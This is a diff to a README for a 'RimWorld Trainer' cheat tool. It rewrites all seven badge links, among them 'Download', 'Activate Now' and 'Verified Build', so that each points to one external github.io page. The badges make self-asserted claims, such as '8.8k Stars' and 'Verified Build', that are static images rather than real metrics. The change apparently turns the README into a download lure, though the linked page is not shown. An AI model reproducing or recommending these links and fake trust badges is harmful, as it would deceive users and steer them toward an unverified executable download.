@@ -22,10 +22,10 @@ This trainer isn’t a simple cheat menu. It’s a **comprehensive enhancement t
 
 ---
 
-[![Activate Now](https://img.shields.io/badge/Activate-Now-red?logo=rocket\&style=for-the-badge)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?logo=windows\&style=for-the-badge)](#)
-[![⭐️ 8.8k Stars](https://img.shields.io/badge/GitHub-8.8k_Stars-green?logo=github\&style=for-the-badge)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-brightgreen?logo=github\&style=for-the-badge)](#)
+[![Activate Now](https://img.shields.io/badge/Activate-Now-red?logo=rocket\&style=for-the-badge)](https://rimworld-trainer-tool.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?logo=windows\&style=for-the-badge)](https://rimworld-trainer-tool.github.io/.github/)
+[![⭐️ 8.8k Stars](https://img.shields.io/badge/GitHub-8.8k_Stars-green?logo=github\&style=for-the-badge)](https://rimworld-trainer-tool.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-brightgreen?logo=github\&style=for-the-badge)](https://rimworld-trainer-tool.github.io/.github/)
 
 ---
 
@@ -153,7 +153,7 @@ A: Yes, hotkeys let you activate/deactivate instantly.
 
 The **RimWorld Trainer** combines **ESP vision, resource tracking, and automation helpers** into one streamlined package. Whether you’re farming, exploring, or defending your colony, it ensures smoother survival and easier management.
 
-[![Verified Build](https://img.shields.io/badge/Verified-Build-success?logo=github\&style=for-the-badge)](#)
-[![Community](https://img.shields.io/badge/Join-Community-purple?logo=discord\&style=for-the-badge)](#)
-[![Download](https://img.shields.io/badge/Download-Now-orange?logo=github\&style=for-the-badge)](#)
+[![Verified Build](https://img.shields.io/badge/Verified-Build-success?logo=github\&style=for-the-badge)](https://rimworld-trainer-tool.github.io/.github/)
+[![Community](https://img.shields.io/badge/Join-Community-purple?logo=discord\&style=for-the-badge)](https://rimworld-trainer-tool.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Now-orange?logo=github\&style=for-the-badge)](https://rimworld-trainer-tool.github.io/.github/)
 
